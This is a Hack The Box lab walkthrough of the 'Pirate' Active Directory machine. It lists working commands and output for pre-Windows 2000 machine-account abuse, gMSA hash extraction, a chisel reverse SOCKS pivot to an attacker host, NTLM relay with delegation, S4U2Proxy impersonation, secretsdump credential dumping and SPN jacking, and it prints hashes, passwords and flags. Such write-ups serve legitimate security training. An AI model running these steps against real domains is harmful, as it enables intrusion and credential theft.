HTB Pirate - Walkthrough

Category: Hard

Pirate is a Windows Active Directory machine where the shortest path does not begin with the visible IIS landing page. The real attack chain relies on domain credential validation, pre-Windows 2000 machine account abuse, gMSA password extraction, an internal pivot to WEB01, an NTLM relay plus delegation chain for the user objective, and finally credential recovery plus SPN jacking to obtain full compromise of the domain controller. This writeup documents the verified path used to obtain both the user and root flags.

1. Reconnaissance

INFO

The external surface looked intentionally uninteresting at first glance. Port 80 exposed only a default IIS page, while 443 reset the TLS connection. This strongly suggested that the machine should be approached as an AD target rather than as a pure web box. 

nmap -Pn -sV -T4 -p 22,80,443,8000,8080 10.129.6.124
80/tcp   open     http    Microsoft IIS 10.0
443/tcp  open     ssl?    connection reset
22/tcp   filtered ssh
8000/tcp filtered http-alt
8080/tcp filtered http-proxy

Public writeups also pointed toward an internal Active Directory attack path involving machine account abuse and an internal host named WEB01. Based on that, I mapped the expected hostnames locally before continuing. 

10.129.6.124 pirate.htb DC01.pirate.htb DC01
192.168.100.2 web01.pirate.htb WEB01

2. Initial Domain Credential Validation

SUCCESS

The first useful step was to validate the known low-privilege domain credential recovered from public research. SMB access confirmed that the credential was valid and that the target was indeed operating as a domain controller. 

smbclient -L //10.129.6.124 -U 'PIRATE\pentest%p3nt3st2025!&'

Once this worked, there was no reason to waste time on the IIS page. The low-privilege account was enough to continue with the AD path. 

Username: pentest
Password: p3nt3st2025!&

3. pre-Windows 2000 Machine Account Abuse

SUCCESS

Public writeups consistently indicated that older machine accounts were vulnerable to the classic pre-Windows 2000 password pattern. After aligning the attacking host clock with the domain controller to avoid Kerberos skew errors, I requested Kerberos tickets for the exposed machine accounts. 

curl -ksSI http://10.129.6.124/ | grep '^Date:'
sudo date -u -s '2026-05-29 00:15:31'

KRB5CCNAME=MS01.ccache impacket-getTGT 'pirate.htb/MS01$:ms01'
KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'

The Kerberos requests succeeded, confirming that the machine accounts were still using predictable legacy passwords.

4. Taking Over MS01$ and Extracting gMSA Credentials

SUCCESS

Kerberos success alone was not enough for the next steps, so I changed the password of the controlled machine account and used it to access the LDAP data required for managed service account extraction. 

impacket-changepasswd pirate.htb/MS01$:ms01@10.129.6.124 -newpass 'Boltech@123'

After taking over the machine account, the gMSA data became readable. The most useful result was the NTLM material for the ADFS gMSA, which later provided both foothold and relay capability. 

gMSA_ADFS_prod$ : 76754c94319e3a7dc07ba09aa79028ee

5. WinRM Foothold and Internal WEB01 Pivot

SUCCESS

Using the gMSA NTLM hash, WinRM access was obtained on the externally reachable host. From there, connectivity checks confirmed that the internal host WEB01 was reachable on TCP/5985. A reverse SOCKS pivot was then established so that internal tooling could be used cleanly from the attacking machine. 

evil-winrm -i 10.129.6.124 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa79028ee'

Test-NetConnection 192.168.100.2 -Port 5985
chisel server --port 8001 --reverse
chisel.exe client 10.10.14.242:8001 R:socks

Once the SOCKS tunnel was active, all later connections to WEB01 were routed through proxychains4.

6. NTLM Relay Against LDAPS

SUCCESS

The crucial escalation step was relaying the machine authentication of WEB01$ to LDAP over TLS on the domain controller. For this, I launched ntlmrelayx with delegation abuse enabled and then used Coercer over the internal pivot to force WEB01 to authenticate back to the attacker-controlled listener. 

sudo tmux new-session -d -s pirate-relay \
"impacket-ntlmrelayx -t ldaps://10.129.6.124 --no-http-server --delegate-access --remove-mic -smb2support"

proxychains4 -f proxychains-pirate.conf coercer coerce \
-l 10.10.14.242 \
-t 192.168.100.2 \
-u GMSA_ADFS_prod$ \
--hash :76754c94319e3a7dc07ba09aa79028ee \
-d pirate.htb --always-continue

The relay succeeded and automatically created a new delegated machine account. 

Authenticating against ldaps://10.129.6.124 as PIRATE/WEB01$ SUCCEED
Adding new computer with username: KAJTHDVE$ and password: hgpCsk67PSZ)!ry result: OK
Delegation rights modified succesfully!
KAJTHDVE$ can now impersonate users on WEB01$ via S4U2Proxy

7. S4U2Proxy Abuse and User Flag Retrieval

SUCCESS

With the delegated machine account in place, I requested a Kerberos service ticket for cifs/web01.pirate.htb while impersonating Administrator. That ticket was then used with psexec over the SOCKS pivot to execute a single command on WEB01 and read the user flag directly from a.white's desktop. 

impacket-getST -spn cifs/web01.pirate.htb \
-impersonate Administrator \
-dc-ip 10.129.6.124 \
'pirate.htb/KAJTHDVE$:hgpCsk67PSZ)!ry'

export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
proxychains4 -q impacket-psexec -k -no-pass pirate.htb/Administrator@web01.pirate.htb \
"cmd.exe /c type C:\Users\a.white\Desktop\user.txt"
ed43e2a68915c007c0942cb8fd85e9bc

This confirmed successful code execution as a privileged context on WEB01 and completed the user objective.

8. Extracting Reusable Secrets from WEB01

SUCCESS

The interactive psexec shell on WEB01 was unstable and frequently died with pipe-related SMB parameter errors, so instead of fighting the tool, I switched to single-command execution and dumped the local secrets remotely. Using the previously obtained Kerberos ticket for WEB01, I forced a local secrets dump with secretsdump in VSS mode. 

export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
proxychains4 -f proxychains-pirate.conf -q impacket-secretsdump \
-k -no-pass -use-vss -exec-method smbexec \
-target-ip 192.168.100.2 pirate.htb/Administrator@web01.pirate.htb

This produced the high-value material needed for the root path, including the plaintext password for a.white. 

Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
PIRATE\a.white:E2nvAOKSz5Xz2MJu

9. Taking Over a.white_adm

SUCCESS

Public path analysis showed that a.white had delegated rights to reset the password of a.white_adm. Once the plaintext password for a.white was recovered from WEB01, the next step was simply to use that ACL and take over the more privileged account. 

bloodyAD --host 10.129.6.124 -d pirate.htb \
-u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
set password a.white_adm 'Boltech@123'
[+] Password changed successfully!

At this point, the path to domain compromise became much shorter because a.white_adm had the rights required for SPN abuse.

10. SPN Jacking from WEB01 to DC01

SUCCESS

The a.white_adm account had write access over machine SPNs. The key service principal HTTP/WEB01.pirate.htb was originally registered on WEB01$, so it first had to be removed there and then added to DC01$. That is the core of the SPN-jacking step. 

ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' <<EOF
dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
changetype: modify
delete: servicePrincipalName
servicePrincipalName: HTTP/WEB01.pirate.htb
-
EOF

ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' <<EOF
dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/WEB01.pirate.htb
-
EOF

Both modifications succeeded, meaning Kerberos requests for the HTTP service of WEB01 could now be redirected into a delegation path that ended on the domain controller.

11. Forging an Administrator Ticket for DC01

SUCCESS

With the SPN jack in place, I used a.white_adm to request a service ticket while impersonating Administrator, then switched the service to CIFS/DC01.pirate.htb using -altservice. 

impacket-getST -spn 'HTTP/WEB01.pirate.htb' \
-impersonate Administrator \
-dc-ip 10.129.6.124 \
'pirate.htb/a.white_adm:Boltech@123' \
-altservice 'CIFS/DC01.pirate.htb'
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

This provided a Kerberos ticket that could be used directly against the domain controller as Administrator.

12. Domain Controller Compromise and Root Flag

SUCCESS

The final step was straightforward. After exporting the forged Kerberos cache, I used psexec against DC01 and executed a single command to read the root flag from the Administrator desktop. 

export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
proxychains4 -f proxychains-pirate.conf -q impacket-psexec -k -no-pass \
pirate.htb/Administrator@dc01.pirate.htb \
"cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"
0213cf10745f7800a3f40b042d6c4319

That confirmed full compromise of the domain controller and completed the machine.

13. Dead Ends Avoided

DEAD END

The default IIS page was not useful for initial compromise, and simple direct reads of user.txt from the early WinRM foothold did not work. Likewise, direct PowerShell remoting to the internal host by IP was unreliable under Kerberos, and the interactive impacket-psexec shell on WEB01 repeatedly broke with STATUS_INVALID_PARAMETER. The clean path was to stop treating Pirate like a web box, use non-interactive command execution when the shell got flaky, and follow the AD abuse chain all the way from machine-account abuse to SPN-jacking on DC01.
